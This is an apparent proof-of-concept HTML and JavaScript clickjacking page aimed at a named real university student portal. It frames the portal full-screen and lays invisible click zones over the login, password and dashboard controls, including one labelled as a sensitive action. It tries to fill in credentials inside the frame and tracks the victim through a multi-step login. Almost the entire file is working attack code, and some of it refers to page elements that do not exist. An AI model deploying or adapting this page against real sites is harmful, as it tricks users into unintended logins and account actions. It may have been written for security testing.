<!DOCTYPE html>
<html>
<head>
    <title>University Portal - Advanced Clickjacking Test</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            overflow: hidden;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
        }
        
        /* TARGET SITE - Full screen */
        #targetSite {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: none;
            z-index: 1;
            transition: opacity 0.3s;
        }
        
        /* MULTI-STEP OVERLAY */
        #stepOverlay {
            position: fixed;
            top: 20px;
            left: 20px;
            background: rgba(0, 0, 0, 0.85);
            color: white;
            padding: 15px;
            border-radius: 10px;
            border-left: 4px solid #3498db;
            z-index: 2147483645;
            font-family: monospace;
            max-width: 350px;
            backdrop-filter: blur(10px);
        }
        
        .step-indicator {
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .step-circle {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: #2c3e50;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 10px;
            font-weight: bold;
            font-size: 12px;
        }
        
        .step-circle.active {
            background: #3498db;
        }
        
        .step-circle.completed {
            background: #2ecc71;
        }
        
        /* INVISIBLE TRIGGER ZONES */
        .invisible-trigger {
            position: fixed;
            background: transparent;
            border: none;
            z-index: 2147483647;
            cursor: pointer;
            opacity: 0;
            pointer-events: all;
            transition: background-color 0.2s;
        }
        
        .invisible-trigger:hover {
            background: rgba(255, 0, 0, 0.1) !important;
        }
        
        /* POSITIONING FOR DIFFERENT PAGES */
        /* Login Page (Step 1) */
        #uidTrigger {
            top: 320px;
            left: 650px;
            width: 180px;
            height: 40px;
        }
        
        #loginButtonTrigger {
            top: 380px;
            left: 650px;
            width: 120px;
            height: 35px;
        }
        
        /* Password Page (Step 2) */
        #passwordTrigger {
            top: 320px;
            left: 650px;
            width: 180px;
            height: 40px;
            display: none;
        }
        
        #submitPasswordTrigger {
            top: 380px;
            left: 650px;
            width: 120px;
            height: 35px;
            display: none;
        }
        
        /* Dashboard Page (Step 3) */
        #dashboardTrigger1 {
            top: 250px;
            left: 200px;
            width: 150px;
            height: 40px;
            display: none;
        }
        
        #dashboardTrigger2 {
            top: 320px;
            left: 200px;
            width: 150px;
            height: 40px;
            display: none;
        }
        
        #dashboardTrigger3 {
            top: 400px;
            left: 200px;
            width: 150px;
            height: 40px;
            display: none;
        }
        
        #sensitiveActionTrigger {
            top: 500px;
            left: 800px;
            width: 200px;
            height: 45px;
            display: none;
        }
        
        /* ADVANCED DEBUG PANEL */
        #debugPanel {
            position: fixed;
            bottom: 10px;
            right: 10px;
            background: rgba(0,0,0,0.95);
            color: #0f0;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 11px;
            border-radius: 8px;
            border: 1px solid #3498db;
            display: none;
            z-index: 2147483646;
            max-width: 400px;
            line-height: 1.4;
            backdrop-filter: blur(5px);
        }
        
        .debug-title {
            color: #3498db;
            font-weight: bold;
            margin-bottom: 8px;
            border-bottom: 1px solid #333;
            padding-bottom: 5px;
            font-size: 12px;
        }
        
        .log-entry {
            color: #f1c40f;
            margin: 2px 0;
            font-size: 10px;
        }
        
        .log-timestamp {
            color: #95a5a6;
            margin-right: 5px;
        }
        
        /* AUTO-DETECT OVERLAY */
        #autoDetectOverlay {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0,0,0,0.9);
            color: white;
            padding: 20px;
            border-radius: 10px;
            border: 2px solid #3498db;
            z-index: 2147483648;
            display: none;
            text-align: center;
            max-width: 500px;
        }
        
        /* LOADING OVERLAY */
        #loadingOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #1a1a2e;
            color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 2147483649;
            font-family: monospace;
        }
        
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* STATUS INDICATOR */
        #statusIndicator {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: rgba(0,0,0,0.8);
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 12px;
            z-index: 2147483645;
            border: 1px solid #3498db;
        }
        
        /* PROGRESS BAR */
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #2c3e50;
            border-radius: 2px;
            margin-top: 10px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: #2ecc71;
            width: 0%;
            transition: width 0.5s;
        }
    </style>
</head>
<body>
    <!-- LOADING OVERLAY -->
    <div id="loadingOverlay">
        <div class="loader"></div>
        <h3>üöÄ Advanced Clickjacking Test Initializing...</h3>
        <p id="loadingText">Loading University Portal</p>
        <div class="progress-bar">
            <div class="progress-fill" id="loadingProgress"></div>
        </div>
    </div>
    
    <!-- STEP OVERLAY -->
    <div id="stepOverlay">
        <div class="step-indicator">
            <div class="step-circle" id="step1">1</div>
            <div>Enter UID (Login Page)</div>
        </div>
        <div class="step-indicator">
            <div class="step-circle" id="step2">2</div>
            <div>Enter Password</div>
        </div>
        <div class="step-indicator">
            <div class="step-circle" id="step3">3</div>
            <div>Dashboard Actions</div>
        </div>
    </div>
    
    <!-- TARGET UNIVERSITY PORTAL -->
    <iframe id="targetSite" 
            src="https://students.cuchd.in/Login.aspx"
            sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals"
            style="display: none;">
    </iframe>
    
    <!-- INVISIBLE TRIGGER ZONES -->
    <!-- Step 1: UID Entry -->
    <div class="invisible-trigger" id="uidTrigger" title="UID Field"></div>
    <div class="invisible-trigger" id="loginButtonTrigger" title="Login Button"></div>
    
    <!-- Step 2: Password Entry -->
    <div class="invisible-trigger" id="passwordTrigger" title="Password Field"></div>
    <div class="invisible-trigger" id="submitPasswordTrigger" title="Submit Password"></div>
    
    <!-- Step 3: Dashboard Actions -->
    <div class="invisible-trigger" id="dashboardTrigger1" title="Profile Button"></div>
    <div class="invisible-trigger" id="dashboardTrigger2" title="Grades Button"></div>
    <div class="invisible-trigger" id="dashboardTrigger3" title="Attendance Button"></div>
    <div class="invisible-trigger" id="sensitiveActionTrigger" title="Sensitive Action"></div>
    
    <!-- AUTO-DETECT OVERLAY -->
    <div id="autoDetectOverlay">
        <h3>üîç Auto-Detection Mode Active</h3>
        <p>Monitoring page transitions...</p>
        <div id="detectionStatus">Waiting for login...</div>
    </div>
    
    <!-- STATUS INDICATOR -->
    <div id="statusIndicator">
        Status: <span id="currentStatus">Initializing...</span>
    </div>
    
    <!-- ADVANCED DEBUG PANEL -->
    <div id="debugPanel">
        <div class="debug-title">üéØ ADVANCED CLICKJACKING MONITOR</div>
        <div>Target: <span id="targetUrl">students.cuchd.in</span></div>
        <div>Current Step: <span id="currentStep">Step 1 - UID Entry</span></div>
        <div>Active Triggers: <span id="activeTriggersCount">2</span></div>
        <div>Successful Actions: <span id="successCount">0</span></div>
        <div>Page URL: <span id="pageUrl">Loading...</span></div>
        <div class="debug-title">üìù ACTIVITY LOG</div>
        <div id="activityLog"></div>
        <div style="margin-top: 10px; font-size: 10px; color: #888;">
            F1: Toggle Debug | F2: Auto-detect | F3: Manual mode<br>
            F5: Reset Test | Ctrl+Arrow: Move triggers | Ctrl+R: Reset positions
        </div>
    </div>

    <script>
        // Initialize variables
        let clickCount = 0;
        let successCount = 0;
        let currentStep = 1;
        let autoDetectMode = false;
        let testUid = "your_uid_here";
        let testPassword = "your_password_here";
        let activityLog = [];
        
        // Configuration for different pages
        const pageConfigs = {
            'Login.aspx': {
                step: 1,
                triggers: ['uidTrigger', 'loginButtonTrigger'],
                nextUrl: /Login\.aspx\?identifier/,
                description: 'UID Entry Page'
            },
            'Login.aspx?identifier': {
                step: 2,
                triggers: ['passwordTrigger', 'submitPasswordTrigger'],
                nextUrl: 'StudentHome.aspx',
                description: 'Password Entry Page'
            },
            'StudentHome.aspx': {
                step: 3,
                triggers: ['dashboardTrigger1', 'dashboardTrigger2', 'dashboardTrigger3', 'sensitiveActionTrigger'],
                description: 'Student Dashboard'
            }
        };
        
        // Log function
        function addLog(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = {
                timestamp,
                message,
                type
            };
            
            activityLog.push(logEntry);
            
            const logDiv = document.getElementById('activityLog');
            const logElement = document.createElement('div');
            logElement.className = 'log-entry';
            logElement.innerHTML = `<span class="log-timestamp">[${timestamp}]</span> ${message}`;
            
            if (type === 'success') logElement.style.color = '#2ecc71';
            if (type === 'warning') logElement.style.color = '#f39c12';
            if (type === 'error') logElement.style.color = '#e74c3c';
            
            logDiv.appendChild(logElement);
            logDiv.scrollTop = logDiv.scrollHeight;
            
            console.log(`[${type.toUpperCase()}] ${message}`);
        }
        
        // Update status
        function updateStatus(message) {
            document.getElementById('currentStatus').textContent = message;
            document.getElementById('statusText').textContent = message;
        }
        
        // Update page URL display
        function updatePageUrl() {
            const iframe = document.getElementById('targetSite');
            try {
                const url = iframe.contentWindow.location.href;
                document.getElementById('pageUrl').textContent = url;
                return url;
            } catch (e) {
                return 'Cross-origin restricted';
            }
        }
        
        // Update step indicators
        function updateStepIndicators(step) {
            for (let i = 1; i <= 3; i++) {
                const circle = document.getElementById(`step${i}`);
                circle.className = 'step-circle';
                if (i === step) circle.classList.add('active');
                if (i < step) circle.classList.add('completed');
            }
            
            const stepDescriptions = {
                1: 'Step 1 - UID Entry',
                2: 'Step 2 - Password Entry', 
                3: 'Step 3 - Dashboard Actions'
            };
            
            document.getElementById('currentStep').textContent = stepDescriptions[step];
        }
        
        // Show/hide triggers based on step
        function updateTriggersForStep(step) {
            // Hide all triggers first
            document.querySelectorAll('.invisible-trigger').forEach(trigger => {
                trigger.style.display = 'none';
            });
            
            // Show triggers for current step
            const triggers = {
                1: ['uidTrigger', 'loginButtonTrigger'],
                2: ['passwordTrigger', 'submitPasswordTrigger'],
                3: ['dashboardTrigger1', 'dashboardTrigger2', 'dashboardTrigger3', 'sensitiveActionTrigger']
            };
            
            triggers[step].forEach(id => {
                document.getElementById(id).style.display = 'block';
            });
            
            document.getElementById('activeTriggersCount').textContent = triggers[step].length;
        }
        
        // Function to trigger attack
        function triggerAttack(action, description, simulateInput = false) {
            clickCount++;
            successCount++;
            
            document.getElementById('clickCounter').textContent = clickCount;
            document.getElementById('successCount').textContent = successCount;
            
            addLog(`${description} triggered`, 'success');
            updateStatus(`${action} triggered`);
            
            // Try to interact with iframe
            const iframe = document.getElementById('targetSite');
            
            if (simulateInput) {
                try {
                    // Simulate input based on action
                    if (action === 'uid') {
                        // Simulate UID entry
                        const event = new Event('input', { bubbles: true });
                        const input = iframe.contentDocument.querySelector('input[type="text"], input[name*="user"], input[name*="login"]');
                        if (input) {
                            input.value = testUid;
                            input.dispatchEvent(event);
                            addLog(`Simulated UID entry: ${testUid}`, 'info');
                        }
                    } else if (action === 'password') {
                        // Simulate password entry
                        const event = new Event('input', { bubbles: true });
                        const input = iframe.contentDocument.querySelector('input[type="password"]');
                        if (input) {
                            input.value = testPassword;
                            input.dispatchEvent(event);
                            addLog('Simulated password entry', 'warning');
                        }
                    }
                } catch (error) {
                    // Cross-origin restrictions
                }
            }
            
            // Visual feedback for testing
            const trigger = document.getElementById(`${action}Trigger`);
            if (trigger) {
                trigger.style.background = 'rgba(46, 204, 113, 0.3)';
                setTimeout(() => {
                    trigger.style.background = 'transparent';
                }, 500);
            }
        }
        
        // Monitor iframe URL changes
        let lastUrl = '';
        function monitorIframe() {
            try {
                const iframe = document.getElementById('targetSite');
                const currentUrl = iframe.contentWindow.location.href;
                
                if (currentUrl !== lastUrl) {
                    lastUrl = currentUrl;
                    addLog(`Page changed: ${currentUrl}`, 'info');
                    
                    // Check which step we're on
                    if (currentUrl.includes('StudentHome.aspx')) {
                        currentStep = 3;
                        updateStatus('Dashboard loaded - Ready for sensitive actions');
                        addLog('Reached dashboard - Attack phase 3 ready', 'success');
                    } else if (currentUrl.includes('identifier')) {
                        currentStep = 2;
                        updateStatus('Password page loaded');
                        addLog('Password page detected - Waiting for password entry', 'warning');
                    } else if (currentUrl.includes('Login.aspx')) {
                        currentStep = 1;
                        updateStatus('Login page loaded');
                    }
                    
                    updateStepIndicators(currentStep);
                    updateTriggersForStep(currentStep);
                    updatePageUrl();
                }
            } catch (error) {
                // Cross-origin restrictions
            }
            
            setTimeout(monitorIframe, 1000);
        }
        
        // Auto-detect mode
        function toggleAutoDetect() {
            autoDetectMode = !autoDetectMode;
            const overlay = document.getElementById('autoDetectOverlay');
            const status = document.getElementById('detectionStatus');
            
            if (autoDetectMode) {
                overlay.style.display = 'block';
                addLog('Auto-detect mode enabled', 'info');
                updateStatus('Auto-detecting pages...');
                
                // Simulate detection
                let simulatedStep = 1;
                const simulateDetection = setInterval(() => {
                    if (!autoDetectMode) {
                        clearInterval(simulateDetection);
                        return;
                    }
                    
                    status.textContent = `Detected Step ${simulatedStep}`;
                    
                    if (simulatedStep < 3) {
                        simulatedStep++;
                    } else {
                        simulatedStep = 1;
                    }
                }, 3000);
            } else {
                overlay.style.display = 'none';
                addLog('Auto-detect mode disabled', 'info');
                updateStatus('Manual mode');
            }
        }
        
        // Initialize triggers
        const triggerConfigs = {
            uidTrigger: { action: 'uid', desc: 'UID field entry', simulate: true },
            loginButtonTrigger: { action: 'login', desc: 'Login button click' },
            passwordTrigger: { action: 'password', desc: 'Password field entry', simulate: true },
            submitPasswordTrigger: { action: 'submitPassword', desc: 'Submit password' },
            dashboardTrigger1: { action: 'profile', desc: 'View profile' },
            dashboardTrigger2: { action: 'grades', desc: 'Check grades' },
            dashboardTrigger3: { action: 'attendance', desc: 'View attendance' },
            sensitiveActionTrigger: { action: 'sensitive', desc: 'Perform sensitive action' }
        };
        
        Object.keys(triggerConfigs).forEach(id => {
            const element = document.getElementById(id);
            if (element) {
                element.addEventListener('click', (e) => {
                    e.preventDefault();
                    const config = triggerConfigs[id];
                    triggerAttack(config.action, config.desc, config.simulate);
                    
                    // Log detailed click info
                    console.log(`üìç Click at: X=${e.clientX}, Y=${e.clientY}`);
                    console.log(`üé≠ User thinks they're clicking: ${config.desc}`);
                    console.log(`‚ö†Ô∏è Actual action: ${config.action}`);
                    
                    // If this is a login button, simulate navigation
                    if (id === 'loginButtonTrigger' && currentStep === 1) {
                        setTimeout(() => {
                            addLog('Simulating navigation to password page...', 'info');
                            updateStatus('Redirecting to password page...');
                            currentStep = 2;
                            updateStepIndicators(currentStep);
                            updateTriggersForStep(currentStep);
                        }, 1000);
                    }
                    
                    if (id === 'submitPasswordTrigger' && currentStep === 2) {
                        setTimeout(() => {
                            addLog('Simulating navigation to dashboard...', 'info');
                            updateStatus('Redirecting to dashboard...');
                            currentStep = 3;
                            updateStepIndicators(currentStep);
                            updateTriggersForStep(currentStep);
                        }, 1000);
                    }
                });
            }
        });
        
        // Hide loading overlay when iframe loads
        document.getElementById('targetSite').onload = function() {
            setTimeout(() => {
                document.getElementById('loadingOverlay').style.display = 'none';
                document.getElementById('targetSite').style.display = 'block';
                
                // Start monitoring
                monitorIframe();
                
                addLog('University portal loaded successfully', 'success');
                updateStatus('Portal loaded - Multi-step attack ready');
                updatePageUrl();
                
                // Show debug panel briefly
                document.getElementById('debugPanel').style.display = 'block';
                setTimeout(() => {
                    document.getElementById('debugPanel').style.display = 'none';
                }, 5000);
            }, 2000);
            
            // Simulate loading progress
            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += 10;
                document.getElementById('loadingProgress').style.width = progress + '%';
                document.getElementById('loadingText').textContent = 
                    `Loading... ${progress}% ${progress < 100 ? '| Initializing attack vectors' : '| Ready for testing'}`;
                
                if (progress >= 100) {
                    clearInterval(progressInterval);
                }
            }, 150);
        };
        
        // Advanced keyboard controls
        document.addEventListener('keydown', (e) => {
            // F1: Toggle debug panel
            if (e.key === 'F1') {
                e.preventDefault();
                const panel = document.getElementById('debugPanel');
                panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
                addLog(`Debug panel ${panel.style.display === 'none' ? 'hidden' : 'shown'}`, 'info');
            }
            
            // F2: Toggle auto-detect mode
            if (e.key === 'F2') {
                e.preventDefault();
                toggleAutoDetect();
            }
            
            // F3: Switch to manual mode
            if (e.key === 'F3') {
                e.preventDefault();
                autoDetectMode = false;
                document.getElementById('autoDetectOverlay').style.display = 'none';
                addLog('Switched to manual mode', 'info');
                updateStatus('Manual mode active');
            }
            
            // F5: Reset test
            if (e.key === 'F5') {
                e.preventDefault();
                location.reload();
            }
            
            // Ctrl+Arrow to move triggers
            if (e.ctrlKey && e.key.startsWith('Arrow')) {
                e.preventDefault();
                const activeTriggers = document.querySelectorAll('.invisible-trigger[style*="display: block"]');
                if (activeTriggers.length > 0) {
                    const trigger = activeTriggers[0];
                    let style = window.getComputedStyle(trigger);
                    let top = parseInt(style.top) || 0;
                    let left = parseInt(style.left) || 0;
                    
                    switch(e.key) {
                        case 'ArrowUp': top -= 10; break;
                        case 'ArrowDown': top += 10; break;
                        case 'ArrowLeft': left -= 10; break;
                        case 'ArrowRight': left += 10; break;
                    }
                    
                    trigger.style.top = top + 'px';
                    trigger.style.left = left + 'px';
                    
                    addLog(`Moved ${trigger.id} to position: ${left}, ${top}`, 'info');
                }
            }
            
            // Ctrl+R: Reset positions
            if (e.ctrlKey && e.key.toLowerCase() === 'r') {
                e.preventDefault();
                const positions = {
                    uidTrigger: { top: 320, left: 650 },
                    loginButtonTrigger: { top: 380, left: 650 },
                    passwordTrigger: { top: 320, left: 650 },
                    submitPasswordTrigger: { top: 380, left: 650 },
                    dashboardTrigger1: { top: 250, left: 200 },
                    dashboardTrigger2: { top: 320, left: 200 },
                    dashboardTrigger3: { top: 400, left: 200 },
                    sensitiveActionTrigger: { top: 500, left: 800 }
                };
                
                Object.keys(positions).forEach(id => {
                    const el = document.getElementById(id);
                    if (el) {
                        el.style.top = positions[id].top + 'px';
                        el.style.left = positions[id].left + 'px';
                    }
                });
                
                addLog('All trigger positions reset to default', 'info');
                updateStatus('Positions reset');
            }
        });
        
        // Initial setup
        updateStepIndicators(1);
        updateTriggersForStep(1);
        
        // Initial log
        addLog('üöÄ Advanced Clickjacking Test Initialized', 'success');
        addLog('Target: https://students.cuchd.in', 'info');
        addLog('Multi-step attack: UID ‚Üí Password ‚Üí Dashboard', 'info');
        addLog('Press F1 for debug panel, F2 for auto-detect mode', 'info');
        console.log('üéì Advanced University Clickjacking Demo Loaded');
        console.log('Target: https://students.cuchd.in');
        console.log('Features: Multi-step tracking, Auto-detection, Activity logging');
        console.log('Steps: 1. UID Entry ‚Üí 2. Password ‚Üí 3. Dashboard');
        console.log('Controls: F1 (debug), F2 (auto-detect), F3 (manual), F5 (reset)');
    </script>
</body>
</html>